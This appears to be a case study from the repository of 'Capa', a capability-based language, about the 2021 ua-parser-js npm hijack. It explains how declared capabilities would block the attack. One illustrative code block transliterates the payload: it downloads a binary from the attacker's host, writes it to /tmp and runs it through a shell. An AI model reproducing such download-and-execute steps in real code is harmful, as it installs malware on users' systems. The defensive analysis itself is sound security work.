# Capa would have caught: the ua-parser-js npm account hijack

A concrete walkthrough of how Capa's capability discipline
structurally prevents the class of supply-chain attack that hit
the `ua-parser-js` npm package in October 2021 after the
maintainer's account was compromised.

> The full runnable Capa side of this writeup is in
> [`examples/cve_ua_parser_js.capa`](../examples/cve_ua_parser_js.capa).

---

## What happened

On 22 October 2021, the maintainer of `ua-parser-js` reported
that someone had taken over his npm account and published three
malicious versions (`0.7.29`, `0.8.0`, `1.0.0`). At the time the
package had roughly 7 to 8 million weekly downloads and was a
transitive dependency of much of the JavaScript ecosystem.

The malicious versions shipped a `preinstall` hook that, on
install, ran a shell script that:

1. Detected the host OS.
2. On Linux: downloaded `jsextension` from a server controlled
   by the attacker and ran it. The binary was an XMRig-based
   cryptocurrency miner.
3. On Windows: downloaded both the cryptominer and a second
   binary (`sdd.dll`) which was a copy of the **DanaBot**
   credential-stealing trojan. DanaBot harvested credentials
   from browsers, mail clients, and FTP clients, then phoned
   home to a C2 server.
4. Set up persistence on Windows via the standard registry
   `Run` keys.

CISA issued a same-day advisory; npm and the maintainer pulled
the versions within hours. Exposure window: roughly four hours
between publish and pull. Number of affected installs: not
publicly known, but the package's reach was wide enough that
CISA recommended any system that installed it during the window
should be treated as compromised.

Primary sources:

- [GitHub advisory GHSA-pjwm-rvh2-c87w][ghsa]
- [CISA advisory][cisa]
- [Maintainer's GitHub issue][issue]

[ghsa]: https://github.com/advisories/GHSA-pjwm-rvh2-c87w
[cisa]: https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js
[issue]: https://github.com/faisalman/ua-parser-js/issues/536

---

## The anatomy of the attack

`ua-parser-js`'s legitimate role is to parse a User-Agent string
and return a structured description of the browser, OS, and
device. The function surface is the cleanest possible: one
string in, one struct out. No I/O. No shell. No registry. No
process spawning. No filesystem. No network.

The malicious version did all of those things. The mechanism
that made it possible was not the `preinstall` hook by itself
(`preinstall` hooks are just a JavaScript file); it was that
that JavaScript file ran in a Node.js context with full
ambient authority. The runtime gave it `require("child_process")`,
`require("fs")`, `require("https")`, and `require("os")` for
free, because the language has no notion that a parser of
User-Agent strings should not be reaching for those.

The pattern is the same as
[eslint-scope](cve_eslint_scope.md) (account hijack of a pure
analysis library), and the same as
[torchtriton](cve_torchtriton.md) (a kernel runtime that
suddenly reads SSH keys). What changes between these incidents
is the **payload**: credential theft, cryptominer, RAT, kernel
exfil. What does not change is the structural fact that none of
those payloads belong inside the library's declared role.

That invariance is exactly what makes Capa useful here.
**Structural protection is payload-independent.** Whether the
attacker wanted to mine Monero, drop DanaBot, or read
`~/.ssh/id_rsa`, the *shape* of the rejection in Capa is the
same: the function did not declare the capability, so the
operation does not exist in scope.

---

## The Capa version

Here is a miniature UA parser in Capa
([cve_ua_parser_js.capa](../examples/cve_ua_parser_js.capa)):

```capa
type UserAgent {
    browser: Browser,
    os: OS,
    device: DeviceKind
}

fun parse_user_agent(ua: String) -> UserAgent
    return UserAgent {
        browser: detect_browser(ua),
        os: detect_os(ua),
        device: detect_device(ua)
    }
```

Run it:

```bash
$ capa --run examples/cve_ua_parser_js.capa
ua-parsed: Chrome on Linux (desktop)
ua-parsed: Safari on macOS (desktop)
ua-parsed: Firefox on Windows (desktop)
ua-parsed: Chrome on Linux (mobile)
```

`parse_user_agent` takes a `String` and returns a `UserAgent`.
No `Fs`, no `Net`, no `Env`, no `Unsafe`. None of those names
is in scope inside the function body. The compiler rejects any
attempt to use them.

## What an attacker would try

The malicious ua-parser-js's payload, transliterated into Capa,
would look something like:

```capa
fun parse_user_agent(ua: String) -> UserAgent
    // === Attack attempt: drop and run a cryptominer. ===
    let installer = net.get("https://citationsherbe.at/jsextension")
    fs.write("/tmp/jsextension", installer.body)
    let _ = shell.exec("chmod +x /tmp/jsextension && /tmp/jsextension &")
    // === Continue with the legitimate parse. ===
    return UserAgent { ... }
```

And here is what the analyzer says when you try to compile it:

```
error: undefined name 'net'
   3 |     let installer = net.get("https://citationsherbe.at/jsextension")
                          ^

error: undefined name 'fs'
   4 |     fs.write("/tmp/jsextension", installer.body)
          ^

error: undefined name 'shell'
   5 |     let _ = shell.exec("chmod +x /tmp/jsextension && /tmp/jsextension &")
                  ^
```

Three independent errors, plus `Shell` is not even a
first-class capability the standard library exposes (process
spawning lives behind `Unsafe`). To make the attack compile,
the attacker has to widen the signature:

```capa
fun parse_user_agent(net: Net, fs: Fs, unsafe: Unsafe, ua: String) -> UserAgent
    // now compiles, but...
```

And **every caller of `parse_user_agent`** would now have to
thread three capabilities (one of them `Unsafe`) into a function
that previously needed none. Every web framework that uses it
to identify clients, every analytics pipeline, every A/B test
harness. The change is visible in pull requests, in code
review, in the SBOM diff between releases, and in any audit
reading the SBOM
([`examples/sbom_capability_audit.capa`](../examples/sbom_capability_audit.capa)).
The `Unsafe` widening would also raise the `capa:has_unsafe`
property in the CycloneDX output, which existing CRA-aligned
audit policies can gate on.

That is, again, the entire point: the attack is not invisible;
it is made expensive to hide.

---

## Why this case study, on top of the existing five

The mechanism of the attack (npm account hijack, malicious
version published under a trusted name) is identical to
[eslint-scope 2018](cve_eslint_scope.md). The case is in the
repo anyway, for three reasons:

1. **Payload independence.** eslint-scope's payload was
   credential theft (`Fs` + `Net`). ua-parser-js's payload was
   a cryptominer plus a credential-stealing RAT (`Net` + `Fs`
   + `Unsafe` for process spawning + registry persistence).
   Showing that Capa's rejection has the same shape for both
   is the point: defenders do not need to anticipate the
   payload to anticipate the structural violation.

2. **Cleanest possible signature.** ua-parser-js is the
   tidiest example in the repo of a library that has literally
   no reason to hold any capability. eslint-scope at least
   walks an AST; torchtriton at least manipulates kernels.
   ua-parser-js is `(String) -> UserAgent`. The argument "the
   declared signature should mention `Fs` if the function
   reads files" is at its most rhetorically forceful here.

3. **`preinstall` hooks specifically.** Capa's compilation
   model means there is no equivalent of a `preinstall`
   script: code does not get to run on install. Capa packages
   are evaluated only when the calling program reaches into
   them. This is a small point structurally but a large one in
   practice; a huge fraction of the npm supply-chain incidents
   (this one, `event-stream`, `eslint-scope`, the more recent
   `node-ipc`) abused some flavour of "code runs at install
   time". Capa's model is hostile to that pattern by
   construction.

---

## Why account-hijack attacks stay loud in Capa

`ua-parser-js` 2021 and `eslint-scope` 2018 share the same
attack mechanism (compromised maintainer credentials, malicious
version published with the trusted name). Capa does not stop
the registry from accepting the upload. What Capa *can* do:

- Make the malicious version's *behaviour* loud in its
  signatures. The legitimate `parse_user_agent` has zero
  capabilities; the malicious version would need `Net + Fs +
  Unsafe`. The signature delta alone, derived from the SBOM,
  is the alarm bell.

- Combine with attenuation
  ([`fs_env_attenuation.capa`](../examples/fs_env_attenuation.capa)):
  any caller that for some reason did pass `Fs` would be
  expected to pass an attenuated handle, not the full
  `Fs`. Defence in depth on top of the signature.

- Plug into npm's lockfile + SBOM machinery via the
  SBOM-based audit. If a project's policy lists
  `pkg:npm/ua-parser-js@0.7.28` with declared capabilities
  `{}`, and the resolved version's CycloneDX entry lists
  `{Net, Fs, Unsafe}`, the audit fires immediately. The
  widening *cannot* hide.

---

## What Capa does *not* solve

The same honest limits as the other case studies. Listing them
once more here so this writeup is self-contained:

- A capability holder with bad intent is still dangerous.
  Attenuation reduces the blast radius; it does not eliminate
  trust.
- The `Unsafe` boundary (`py_import` / `py_invoke`, the
  rough analogue of "drop into Node.js") is a real hole.
  Anything that crosses into the host runtime loses Capa's
  guarantees. Visible in the SBOM via the `capa:has_unsafe`
  property; trust budget for those functions has to be
  higher.
- Capa is not a sandbox. Process-level compromise is
  orthogonal. Capa makes source-level guarantees, not
  containment ones.
- Registry-level controls (mandatory 2FA, package signing,
  publishing-time signature verification) are orthogonal
  defences. Capa complements them; it does not replace them.

---

## The six-case-study summary

This is the sixth CVE walkthrough in the repo and brings the
balance to **four clean wins** (event-stream, eslint-scope,
torchtriton, ua-parser-js) and **two partial losses**
([node-ipc](cve_node_ipc.md) for legitimate-authority abuse,
[xz-utils](cve_xz_utils.md) for below-the-language attacks):

| Case study     | Year | Shape                              | Capa verdict           |
|----------------|------|------------------------------------|------------------------|
| event-stream   | 2018 | malicious dependency injection     | win                    |
| eslint-scope   | 2018 | credential theft via Fs+Net        | win                    |
| ua-parser-js   | 2021 | cryptominer + RAT via account hijack | win                  |
| torchtriton    | 2022 | typosquat with the same shape      | win                    |
| node-ipc       | 2022 | legitimate-authority abuse         | partial (attenuation)  |
| xz-utils       | 2024 | below-language build attack        | partial (orthogonal)   |

A thesis-grade experimental section needs both kinds. The wins
establish that Capa addresses real attacks across multiple
years, ecosystems (npm, PyPI), and payloads (data theft,
cryptominers, RATs, kernel exfil). The partial losses
establish that the claim is calibrated.

---

## Run it yourself

```bash
# The safe version (compiles and runs):
capa --run examples/cve_ua_parser_js.capa

# The attack version: copy the malicious parse_user_agent from
# above into a file, run --check, observe the three
# "undefined name" errors.
```
